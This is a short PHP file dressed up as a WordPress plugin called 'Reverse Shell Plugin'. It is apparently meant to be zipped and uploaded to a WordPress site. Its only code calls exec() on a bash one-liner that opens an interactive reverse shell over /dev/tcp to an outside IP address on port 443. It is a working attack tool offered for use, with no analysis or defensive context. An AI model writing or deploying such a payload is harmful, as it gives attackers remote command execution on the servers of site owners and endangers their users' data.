<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: pwn
* Author URI: pwn.pwn.com
* Remember to zip zip plugin.zip ./shell.php
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.167.8.8/443 0>&1'");
?>
